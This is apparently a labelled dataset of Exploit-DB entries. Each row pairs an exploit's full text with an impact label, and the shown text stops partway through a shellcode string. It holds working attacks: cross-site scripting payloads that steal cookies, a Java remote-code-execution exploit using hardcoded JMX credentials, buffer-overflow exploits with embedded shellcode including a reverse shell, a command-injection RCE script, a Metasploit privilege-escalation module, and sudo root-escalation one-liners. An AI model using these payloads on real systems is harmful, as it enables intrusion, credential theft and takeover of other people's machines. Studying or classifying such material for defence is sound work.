29915,MoinMoin 1.5.x - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/23676/info  MoinMoin is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  MoinMoin 1.5.7 is vulnerable; other versions may also be affected.  http://www.example.com/action=AttachFile&do=<script src=http://js_script></script>,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
46887,"Brocade Network Advisor 14.4.1 - Unauthenticated Remote Code Execution /*                                                                            Exploit Title: Brocade Network Advisor - Unauthenticated Remote Code Execution    Date: 2017-03-29    Exploit Author: Jakub Palaczynski    Vendor Homepage: https://www.broadcom.com/    CVE: CVE-2018-6443     Version:       Tested on Brocade Network Advisor 14.X.X versions. Other may also be affected.       Tested on EMC Connectrix Manager Converged Network Edition 14.4.1. Other may also be affected.       IBM Network Advisor seems to also be affected.     Info: Exploit uses hardcoded and undocumented credentials for JBoss JMX to execute arbitrary command on system. */  import javax.management.remote.*; import javax.management.*; import java.util.*; import java.lang.*; import java.io.*; import java.net.*; import com.sun.net.httpserver.*; import java.util.Scanner; import java.security.*; import java.security.cert.*; import javax.net.ssl.*; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.HttpsURLConnection; import javax.net.ssl.SSLContext; import javax.net.ssl.SSLSession; import javax.net.ssl.TrustManager; import javax.net.ssl.X509TrustManager; import java.security.cert.X509Certificate; import java.util.regex.Pattern; import java.util.regex.Matcher;  public class RemoteMbean {   private static String JARNAME = ""compr.jar"";  private static String OBJECTNAMEA = ""BNASupport:name=support,id=3434"";  private static String OBJECTNAMEB = ""BNASecurity:name=loader,id=3535"";  private static String EVILCLASS = ""com.expl.Evil"";   private static String localIP;  private static int localPort;  private static String connString;  private static String command;  private static String username;  private static String password;  private static String host;  private static int port;  private static int jmxport;  private static String tspwd;   public static void main(String[] args) {   try {    if (args.length < 3) {     showHelp();    }     tspwd = ""changeit""; // default Java keystore password    host = args[0].split("":"")[0]; // IP of BNA    port = Integer.parseInt(args[0].split("":"")[1]); // HTTPS port of BNA     char SEP = File.separatorChar;    String path = System.getProperty(""java.home"") + SEP + ""lib"" + SEP + ""security"";    File dir = new File(path);    File file = new File(dir, ""cacerts"");    if (file.isFile() == false) {     file = new File(dir, ""jssecacerts"");     path = path + SEP + ""jssecacerts"";    } else {     path = path + SEP + ""cacerts"";    }     // import SSL certificate into Java keystore    checkCert(tspwd, file, path, host, port);     // check if hardcoded password is still there and find JMX port    jmxport = checkPwd(args[0]);     if (jmxport == 0) {     System.out.println(""[-] Cannot find JMX port, trying default ..."");     jmxport = 24604;    }     connString = ""service:jmx:remote://"" + host + "":"" + jmxport + ""/""; // connection string for JMX - if ""Unsupported protocol"" error then maybe should be changed to ""remoting-jmx""    command = args[1]; // command to execute    localIP = args[2].split("":"")[0]; // reverse IP address    localPort = Integer.parseInt(args[2].split("":"")[1]); // reverse port    username = ""admin""; // hardcoded username    password = ""no12see!""; // hardcoded password     // starting HTTP server for serving mlet    System.out.println(""[+] Starting HTTP server."");    HttpServer server = HttpServer.create(new InetSocketAddress(localPort), 0);    server.createContext(""/mlet"", new MLetHandler());    server.createContext(""/"" + JARNAME, new JarHandler());    server.setExecutor(null);    server.start();     // start exploitation    connectAndOwn(connString, command, username, password);    server.stop(0);     // clean up Java keystore    deleteCertificate(file, path, tspwd, host);    } catch (Exception e) {    e.printStackTrace();   }  }   static void showHelp() {   System.out.println(""HOWTO: java -cp ./jboss-cli-client.jar:. RemoteMbean IP:BNA_HTTPS_PORT/ \""COMMAND\"" REVERSEIP:REVERSEPORT"");   System.out.println(""Example: java -cp ./jboss-cli-client.jar:. RemoteMbean 127.0.0.1:443 \""id\"" 127.0.0.1:1234"");   System.exit(0);  }   static boolean checkCert(String tspwd, File file, String path, String host, int port) {   try {    InputStream in = new FileInputStream(file);    KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());    ks.load( in , tspwd.toCharArray()); in .close();     SSLContext context = SSLContext.getInstance(""TLS"");    TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());    tmf.init(ks);    X509TrustManager defaultTrustManager = (X509TrustManager) tmf.getTrustManagers()[0];    SavingTrustManager tm = new SavingTrustManager(defaultTrustManager);    context.init(null, new TrustManager[] { tm }, null);    SSLSocketFactory factory = context.getSocketFactory();     System.out.println(""[+] Checking certificate."");    SSLSocket socket = (SSLSocket) factory.createSocket(host, port);    socket.setSoTimeout(10000);    try {     socket.startHandshake();     socket.close();     System.out.println(""[+] Certificate is already trusted."");     return true;    } catch (SSLException e) {     // e.printStackTrace(System.out); // uncomment to see what SSL error occured    }     X509Certificate[] chain = tm.chain;    if (chain == null) {     System.out.println(""[-] Failed to obtain certificate. Connection to JMX server may fail."");     return false;    }     BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));     MessageDigest sha1 = MessageDigest.getInstance(""SHA1"");    MessageDigest md5 = MessageDigest.getInstance(""MD5"");    for (int i = 0; i < chain.length; i++) {     X509Certificate cert = chain[i];     sha1.update(cert.getEncoded());     md5.update(cert.getEncoded());    }     X509Certificate cert = chain[0];    String alias = host;    ks.setCertificateEntry(alias, cert);     OutputStream out = new FileOutputStream(path);    ks.store(out, tspwd.toCharArray());    out.close();     System.out.println(""[+] Added certificate to "" + path + "" using alias '"" + alias + ""'"");    } catch (Exception e) {    e.printStackTrace();   }   return true;  }   static int checkPwd(String target) {   try {    TrustManager[] trustAllCerts = new TrustManager[] {     new X509TrustManager() {      public java.security.cert.X509Certificate[] getAcceptedIssuers() {       return null;      }      public void checkClientTrusted(X509Certificate[] certs, String authType) {}      public void checkServerTrusted(X509Certificate[] certs, String authType) {}     }    };     SSLContext sc = SSLContext.getInstance(""SSL"");    sc.init(null, trustAllCerts, new java.security.SecureRandom());    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());     HostnameVerifier allHostsValid = new HostnameVerifier() {     public boolean verify(String hostname, SSLSession session) {      return true;     }    };     HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);     // connect to BNA website    System.out.println(""[+] Connecting to BNA website."");    URL url = new URL(""https://"" + target + ""/dcm-client/dcmclient.jnlp"");    HttpURLConnection con = (HttpURLConnection) url.openConnection();    con.setRequestMethod(""GET"");    BufferedReader in = new BufferedReader(     new InputStreamReader(con.getInputStream()));    String inputLine;    StringBuffer content = new StringBuffer();    while ((inputLine = in .readLine()) != null) {     content.append(inputLine);    } in .close();    con.disconnect();     // check for hardcoded password    if (!(content.indexOf(""k62dCsMggeFy9oyf93Rujw=="") >= 0)) {     System.out.println(""[-] Cannot find hardcoded credentials."");     return 0;    }    else {     System.out.println(""[+] Hardcoded credentials confirmed."");    }     // retrieve JMX port    Pattern p = Pattern.compile(Pattern.quote(""jnlp.dcm.dcm.jmxport\"""") + ""(.*?)"" + Pattern.quote("">""));    Matcher m = p.matcher(content);    while (m.find()) {     System.out.println(""[+] Found JMX port: "" + m.group(1).split(""\"""")[1] + ""."");     return Integer.parseInt(m.group(1).split(""\"""")[1]);    }    } catch (Exception e) {    e.printStackTrace();    return 0;   }   return 0;  }    static void connectAndOwn(String connString, String command, String username, String password) {   JMXConnector c;    try {    JMXServiceURL u = new JMXServiceURL(connString);     // connect and authenticate    System.out.println(""[+] Connecting using hardcoded credentials..."");    Map env = new HashMap();    String[] creds = {     username,     password    };    env.put(JMXConnector.CREDENTIALS, creds);    c = JMXConnectorFactory.connect(u, env);    System.out.println(""[+] Successfully connected."");     MBeanServerConnection m = c.getMBeanServerConnection();     // check if custom MBeans already exist    ObjectInstance evil_bean = null;    try {     evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAMEA));    } catch (Exception e) {     evil_bean = null;    }     if (evil_bean == null) {     ObjectInstance oi = null;     ObjectName mletObjName = new ObjectName(OBJECTNAMEA);     ObjectName mletLoaderName = new ObjectName(OBJECTNAMEB);      System.out.println(""[+] Registering MLet class."");     try {      oi = m.createMBean(""javax.management.loading.MLet"", mletLoaderName);     } catch (javax.management.InstanceAlreadyExistsException e) {      oi = m.getObjectInstance(new ObjectName(OBJECTNAMEB));     }      System.out.println(""[+] MLet class successfully registered."");     System.out.println(""[+] Downloading and registering custom class."");     Object res = m.invoke(oi.getObjectName(), ""getMBeansFromURL"", new Object[] {      String.format(""http://%s:%d/mlet/"", localIP, localPort)     }, new String[] {      String.class.getName()     });     HashSet res_set = ((HashSet) res);     Iterator itr = res_set.iterator();     Object nextObject = itr.next();     if (nextObject instanceof Exception) {      throw ((Exception) nextObject);     }     evil_bean = ((ObjectInstance) nextObject);    }    System.out.println(""[+] Custom class successfully registered."");    System.out.println(""[+] Running command.\n"");    ObjectName plok = new ObjectName(OBJECTNAMEA);    Object result = m.invoke(evil_bean.getObjectName(), ""runCommand"", new Object[] {     command    }, new String[] {     String.class.getName()    });    System.out.println(""Result:\n"" + result + ""\n"");     // unregister custom MBeans    System.out.println(""[+] Cleaning up JMX."");    for (ObjectInstance x: m.queryMBeans(null, null)) {     if (x.getObjectName().toString().startsWith(""BNASecurity"")) {      m.unregisterMBean(x.getObjectName());     }    }     for (ObjectInstance x: m.queryMBeans(null, null)) {     if (x.getObjectName().toString().startsWith(""BNASupport"")) {      m.unregisterMBean(x.getObjectName());     }    }   } catch (Exception e) {    e.printStackTrace();   }  }   static class MLetHandler implements HttpHandler {   public void handle(HttpExchange t) throws IOException {    String response = String.format(""<HTML><MLET CODE=%s ARCHIVE=%s NAME=%s CODEBASE=http://%s:%d/></MLET></HTML>"", EVILCLASS, JARNAME, OBJECTNAMEA, localIP, localPort);    System.out.println(""[+] Received reverse connection for HTTP page."");    t.sendResponseHeaders(200, response.length());    OutputStream os = t.getResponseBody();    os.write(response.getBytes());    os.close();   }  }   static class JarHandler implements HttpHandler {   public void handle(HttpExchange t) throws IOException {    System.out.println(""[+] Received reverse connection for JAR file."");    File file = new File(JARNAME);    byte[] bytearray = new byte[(int) file.length()];    FileInputStream fis = new FileInputStream(file);    BufferedInputStream bis = new BufferedInputStream(fis);    bis.read(bytearray, 0, bytearray.length);    t.sendResponseHeaders(200, file.length());    OutputStream os = t.getResponseBody();    os.write(bytearray, 0, bytearray.length);    os.close();   }  }   private static final char[] HEXDIGITS = ""0123456789abcdef"".toCharArray();   private static String toHexString(byte[] bytes) {   StringBuilder sb = new StringBuilder(bytes.length * 3);   for (int b: bytes) {    b &= 0xff;    sb.append(HEXDIGITS[b >> 4]);    sb.append(HEXDIGITS[b & 15]);    sb.append(' ');   }   return sb.toString();  }   public static void deleteCertificate(File trustStore, String path, String password, String alias) {   try (final FileInputStream fis = new FileInputStream(trustStore)) {    final KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());    keystore.load(fis, password.toCharArray());    if (keystore.containsAlias(alias)) {     keystore.deleteEntry(alias);     OutputStream writeStream = new FileOutputStream(path);     keystore.store(writeStream, password.toCharArray());     writeStream.close();     System.out.println(""[+] Certificate deleted from keystore."");    }    else {     System.out.println(""[-] Alias "" + alias + "" not found in keystore."");    }   }   catch (final Exception e) {    System.out.println(""[-] Error occured while deleting certificate."");   }  }   private static class SavingTrustManager implements X509TrustManager {   private final X509TrustManager tm;   private X509Certificate[] chain;   SavingTrustManager(X509TrustManager tm) {    this.tm = tm;   }    @Override   public X509Certificate[] getAcceptedIssuers() {    return new X509Certificate[0];    // throw new UnsupportedOperationException();   }    @Override   public void checkClientTrusted(final X509Certificate[] chain,    final String authType)   throws CertificateException {    throw new UnsupportedOperationException();   }    @Override   public void checkServerTrusted(final X509Certificate[] chain,    final String authType)   throws CertificateException {    this.chain = chain;    this.tm.checkServerTrusted(chain, authType);   }  } }",Remote Code Execution,1
34126,"Microsoft Help and Support Center - '/sysinfo/sysinfomain.htm' Cross-Site Scripting source: https://www.securityfocus.com/bid/40721/info  Help and Support Center is prone to a cross-site scripting weakness because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the privileged zone of the browser of an unsuspecting user.  NOTE: This issue is a weakness because the affected file is only accessible by trusted sources unless other vulnerabilities, such as BID 40725 (Microsoft Windows Help And Support Center Trusted Document Whitelist Bypass Vulnerability) are used to bypass the restrictions. This weakness may then be used to execute script code in the privileged zone of the browser by unauthorized sites.   The following example URI is available:  hcp://system/sysinfo/sysinfomain.htm?svr=<h1>test</h1>",execute arbitrary script code in the privileged zone of the browser of an unsuspecting user,1
8580,"Mercury Audio Player 1.21 - '.b4s' Local Stack Overflow #usage: exploit.py print ""**************************************************************************"" print "" Mercury Audio Player 1.21 (.b4s) Local Stack Overflow\n"" print "" Refer: http://www.milw0rm.com/exploits/8578"" print "" Exploit code: His0k4"" print "" Tested on: Windows XP Pro SP3 (EN)\n"" print "" greetz: TO ELITE ALGERIANS,snakespc.com\n"" print ""**************************************************************************""          	  header1 = ( ""\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31"" ""\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x27\x55\x54"" ""\x46\x2d\x38\x27\x20\x73\x74\x61\x6e\x64\x61\x6c\x6f\x6e\x65\x3d"" ""\x22\x79\x65\x73\x22\x3f\x3e\x0d\x0a\x3c\x21\x2d\x2d\x20\x54\x68"" ""\x65\x20\x74\x61\x67\x20\x62\x65\x6c\x6f\x77\x20\x70\x72\x6f\x76"" ""\x69\x64\x65\x73\x20\x63\x6f\x6d\x70\x61\x74\x69\x62\x69\x6c\x69"" ""\x74\x79\x20\x77\x69\x74\x68\x20\x57\x69\x6e\x61\x6d\x70\x33\x20"" ""\x2d\x2d\x3e\x0d\x0a\x20\x3c\x57\x69\x6e\x61\x6d\x70\x58\x4d\x4c"" ""\x3e\x0d\x0a\x3c\x21\x2d\x2d\x20\x47\x65\x6e\x65\x72\x61\x74\x65"" ""\x64\x20\x62\x79\x20\x4d\x65\x72\x63\x75\x72\x79\x20\x41\x75\x64"" ""\x69\x6f\x20\x50\x6c\x61\x79\x65\x72\x20\x31\x2e\x32\x31\x20\x2d"" ""\x2d\x3e\x0d\x0a\x20\x20\x3c\x70\x6c\x61\x79\x6c\x69\x73\x74\x20"" ""\x6e\x75\x6d\x5f\x65\x6e\x74\x72\x69\x65\x73\x3d\x22\x31\x22\x20"" ""\x6c\x61\x62\x65\x6c\x3d\x22\x50\x6c\x61\x79\x6c\x69\x73\x74\x20"" ""\x30\x30\x31\x22\x3e\x0d\x0a\x20\x20\x20\x20\x3c\x65\x6e\x74\x72"" ""\x79\x20\x50\x6c\x61\x79\x73\x74\x72\x69\x6e\x67\x3d\x22\x66\x69"" ""\x6c\x65\x3a"")  header2 = ( ""\x2e\x6d\x70\x33\x22\x3e\x0d\x0a\x20\x20\x20\x20\x20\x20\x3c\x4e"" ""\x61\x6d\x65\x3e\x20\x2d\x20\x3c\x2f\x4e\x61\x6d\x65\x3e\x0d\x0a"" ""\x20\x20\x20\x20\x3c\x2f\x65\x6e\x74\x72\x79\x3e\x0d\x0a\x20\x20"" ""\x3c\x2f\x70\x6c\x61\x79\x6c\x69\x73\x74\x3e\x0d\x0a\x20\x3c\x2f"" ""\x57\x69\x6e\x61\x6d\x70\x58\x4d\x4c\x3e\x0d\x0a"") 			 buff = ""\x41"" * 800 jump = ""\x67\x86\x86\x7C"" # jmp esp kernerl32.dll nops = ""\x90""*6  # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com shellcode = ( ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"" ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"" ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"" ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"" ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"" ""\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x47"" ""\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x58"" ""\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x38"" ""\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"" ""\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"" ""\x46\x4f\x4b\x33\x46\x35\x46\x42\x46\x30\x45\x37\x45\x4e\x4b\x58"" ""\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"" ""\x4b\x38\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x58"" ""\x41\x50\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x30\x43\x4c\x41\x43"" ""\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x43\x45\x48\x42\x4c\x4a\x47"" ""\x4e\x50\x4b\x48\x42\x34\x4e\x30\x4b\x48\x42\x47\x4e\x51\x4d\x4a"" ""\x4b\x38\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"" ""\x42\x30\x42\x30\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x55\x41\x43"" ""\x48\x4f\x42\x46\x48\x55\x49\x58\x4a\x4f\x43\x58\x42\x4c\x4b\x37"" ""\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x59"" ""\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56"" ""\x4e\x56\x43\x36\x42\x30\x5a"")  exploit = header1 + buff + jump + nops + shellcode + header2  try:     out_file = open(""exploit.b4s"",'w')     out_file.write(exploit)     out_file.close()     raw_input(""\nExploit file created!\n"") except:     print ""Error""  # milw0rm.com [2009-04-30]",privilege escalation,1
27844,EPublisherPro 0.9.7 - 'Moreinfo.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/17907/info  EPublisherPro is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/publisher/moreinfo.asp?bookid=2&title=%3Cscript%3Ealert(document.cookie)%3C/script%3E,have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
48536,"QuickBox Pro 2.1.8 - Authenticated Remote Code Execution # Exploit Title: QuickBox Pro 2.1.8 - Authenticated Remote Code Execution # Date: 2020-05-26 # Exploit Author: s1gh # Vendor Homepage: https://quickbox.io/ # Vulnerability Details: https://s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/ # Version: <= 2.1.8 # Description: An authenticated low-privileged user can exploit a command injection vulnerability to get code-execution as www-data and escalate privileges to root due to weak sudo rules. # Tested on: Debian 9 # CVE: CVE-2020-13448 # References: https://github.com/s1gh/QuickBox-Pro-2.1.8-Authenticated-RCE  ''' Privilege escalation: After getting a reverse shell as the www-data user you can escalate to root in one of two ways. 1. sudo mysql -e '\! /bin/sh' 2. sudo mount -o bind /bin/sh /bin/mount;sudo mount  '''  #!/usr/bin/env python3 # -*- coding: utf-8 -*-  import requests import argparse import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from urllib.parse import quote_plus  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  def exploit(args):     s = requests.Session()     print('[*] Sending our payload...')      s.post('https://' + args.ip + '/inc/process.php', data={'username': args.username, 'password': args.password, 'form_submission': 'login'}, verify=False)     try:         s.get('https://' + args.ip + '/index.php?id=88&servicestart=a;' + quote_plus(args.cmd) + ';', verify=False)     except requests.exceptions.ReadTimeout:         pass  def main():     parser = argparse.ArgumentParser(description=""Authenticated RCE for QuickBox Pro <= v2.1.8"")     parser.add_argument('-i',dest='ip',required=True,help=""Target IP Address"")     parser.add_argument('-u',dest='username',required=True,help=""Username"")     parser.add_argument('-p',dest='password',required=True,help=""Password"")     parser.add_argument('-c',dest='cmd', required=True, help=""Command to execute"")     args = parser.parse_args()      exploit(args)   if __name__ == '__main__':     main()     sys.exit(0)",Code Execution,1
48021,"Windscribe - WindscribeService Named Pipe Privilege Escalation (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   Rank = ExcellentRanking    include Exploit::EXE   include Post::File   include Post::Windows::Priv   include Post::Windows::Services   include Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Windscribe WindscribeService Named Pipe Privilege Escalation',       'Description'    => %q{         The Windscribe VPN client application for Windows makes use of a         Windows service `WindscribeService.exe` which exposes a named pipe         `\\.\pipe\WindscribeService` allowing execution of programs with         elevated privileges.          Windscribe versions prior to 1.82 do not validate user-supplied         program names, allowing execution of arbitrary commands as SYSTEM.          This module has been tested successfully on Windscribe versions         1.80 and 1.81 on Windows 7 SP1 (x64).       },       'License'        => MSF_LICENSE,       'Author'         =>       [         'Emin Ghuliev', # Discovery and exploit         'bcoles'        # Metasploit       ],       'References'     =>         [           ['CVE', '2018-11479'],           ['URL', 'http://blog.emingh.com/2018/05/windscribe-vpn-privilege-escalation.html'],           ['URL', 'https://pastebin.com/eLG3dpYK']         ],       'Platform'       => ['win'],       'SessionTypes'   => ['meterpreter'],       'Targets'        => [['Automatic', {}]],       'DisclosureDate' => '2018-05-24',       'DefaultOptions' =>         {           'PAYLOAD' => 'windows/meterpreter/reverse_tcp'         },       'Notes'          =>         {           'Reliability' => [ REPEATABLE_SESSION ],           'Stability'   => [ CRASH_SAFE ]         },       'DefaultTarget'  => 0))     register_advanced_options [       OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)', nil]),     ]   end    def base_dir     datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s   end    def service_exists?(service)     srv_info = service_info(service)      if srv_info.nil?       vprint_warning 'Unable to enumerate Windows services'       return false     end      if srv_info && srv_info[:display].empty?       return false     end      true   end    def write_named_pipe(pipe, command)     kt = ""\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""     kt << ""\x00\x00\x00\x00""     kt << [command.force_encoding('UTF-8').codepoints.map { |c| ""%04X"" % c }.join].pack('H*')     kt << ""\x00"" * (32_005 - kt.length)      print_status ""Sending #{command} to #{pipe} ...""      r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0, nil, 'OPEN_EXISTING', 0, nil)     handle = r['return']      if handle == 0xffffffff # INVALID_HANDLE_VALUE       print_error ""Invalid handle. #{pipe} named pipe not found, or already opened""       return false     end      vprint_good(""Opended #{pipe}! Proceeding ..."")      begin       w = client.railgun.kernel32.WriteFile(handle, kt, kt.length, 4, nil)       if w['return'] == false         return false       end     ensure       session.railgun.kernel32.CloseHandle(handle)     end      true   rescue     false   end    def check     service = 'WindscribeService'      unless service_exists? service       return CheckCode::Safe(""Service '#{service}' does not exist"")     end      CheckCode::Detected   end    def exploit     unless check == CheckCode::Detected       fail_with Failure::NotVulnerable, 'Target is not vulnerable'     end      if is_system?       fail_with Failure::BadConfig, 'Session already has SYSTEM privileges'     end      payload_path = ""#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe""     payload_exe = generate_payload_exe     vprint_status ""Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ...""     write_file payload_path, payload_exe     register_file_for_cleanup payload_path      unless write_named_pipe(""\\\\.\\pipe\\WindscribeService"", payload_path)       fail_with Failure::Unknown, 'Failed to write to pipe'     end   end end",execution of programs with elevated privileges,1
34908,IBM Tivoli Access Manager for E-Business - '/ibm/wpm/acl?method' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info   IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable.   http://www.example.com/ibm/wpm/acl?method=props%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
30520,WordPress Core 1.0.7 - 'Pool index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/25413/info  WordPress Pool is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/index.php/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
46797,"Xitami Web Server 2.5 - Remote Buffer Overflow (SEH + Egghunter) # Exploit Title: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter) # Date: May 4, 2019 # Author: ElSoufiane # Version: 2.5b4 # Tested on: Windows Vista Ultimate (Build 6000) and Windows XP SP3 Professional # Discovered by: Krystian Kloskowski # # Set up a multi handler listener in MSFConsole # then run exploit # # root@f6c9fa91b403:~/XitamiWebServer# python exploit.py 192.168.1.149 # [+] Sending exploit payload... # # Check the MSFConsole listener # # msf5 exploit(multi/handler) > run # [*] Started reverse TCP handler on 0.0.0.0:5801 # [*] Encoded stage with x86/shikata_ga_nai # [*] Sending encoded stage (267 bytes) to 172.17.0.1 # [*] Command shell session 6 opened (172.17.0.2:5801 -> 172.17.0.1:39416) at 2019-05-04 00:17:55 +0000    # C:\Xitami>  import socket import sys import struct  if len(sys.argv) != 2 : 	print ""[+] Usage : python exploit.py [VICTIM_IP]"" 	exit(0)  TCP_IP = sys.argv[1] TCP_PORT = 80   egg = ""SOUFSOUF"" nops = ""\x90""*10  #msfvenom -p windows/shell/reverse_tcp LPORT=5801 LHOST=192.168.1.129 -f python -v shellcode -e x86/alpha_mixed shellcode = ""\x89\xe0\xd9\xe5\xd9\x70\xf4\x5b\x53\x59\x49\x49"" shellcode += ""\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"" shellcode += ""\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"" shellcode += ""\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"" shellcode += ""\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"" shellcode += ""\x69\x6c\x68\x68\x6c\x42\x63\x30\x37\x70\x63\x30"" shellcode += ""\x51\x70\x6b\x39\x6d\x35\x70\x31\x6f\x30\x70\x64"" shellcode += ""\x4e\x6b\x76\x30\x70\x30\x4e\x6b\x76\x32\x54\x4c"" shellcode += ""\x6e\x6b\x72\x72\x46\x74\x6c\x4b\x53\x42\x55\x78"" shellcode += ""\x34\x4f\x4e\x57\x42\x6a\x35\x76\x30\x31\x59\x6f"" shellcode += ""\x4e\x4c\x77\x4c\x70\x61\x31\x6c\x75\x52\x34\x6c"" shellcode += ""\x35\x70\x6b\x71\x38\x4f\x56\x6d\x47\x71\x4a\x67"" shellcode += ""\x4a\x42\x49\x62\x63\x62\x63\x67\x6e\x6b\x63\x62"" shellcode += ""\x52\x30\x4c\x4b\x53\x7a\x77\x4c\x6e\x6b\x70\x4c"" shellcode += ""\x72\x31\x31\x68\x59\x73\x30\x48\x53\x31\x68\x51"" shellcode += ""\x72\x71\x4e\x6b\x30\x59\x57\x50\x55\x51\x6e\x33"" shellcode += ""\x4c\x4b\x73\x79\x72\x38\x48\x63\x56\x5a\x62\x69"" shellcode += 